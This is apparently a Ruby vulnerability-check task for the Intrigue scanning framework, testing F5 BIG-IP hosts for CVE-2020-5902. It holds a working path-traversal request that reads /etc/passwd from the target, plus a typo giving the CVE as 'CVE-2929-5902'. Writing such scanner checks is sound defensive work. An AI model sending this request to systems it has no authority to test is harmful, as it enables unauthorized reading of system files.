module Intrigue
  module Task
  class  F5BigIpConfigUtilCve20205902 < BaseTask
  
    def self.metadata
      {
        :name => "vuln/f5_bigip_configuration_utility_cve_2020_5902",
        :pretty_name => "Vuln Check - F5 BIG-IP Config Utility RCE (CVE-2929-5902)",
        :authors => ["jcran"],
        :description => "This task checks checks a F5 Config Util endpoint for a version vulnerable to CVE-2020-5902.",
        :type => "vuln_check",
        :passive => false,
        :allowed_types => ["Uri"],
        :example_entities => [{"type" => "Uri", "details" => {"name" => "https://intrigue.io"}}],
        :allowed_options => [],
        :created_types => []
      }
    end
  
    ## Default method, subclasses must override this
    def run
      super
  
      require_enrichment
  
      check_url = "#{_get_entity_name}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
  
      response = http_get_body(check_url)

      if response =~ /root:x:0:0/
        _create_linked_issue "f5_bigip_configuration_utility_cve_2020_5902", {"proof" => response}
      else 
        _log "Unable to verify vulnerability"
      end

    end
  
   
  end
  end
  end
  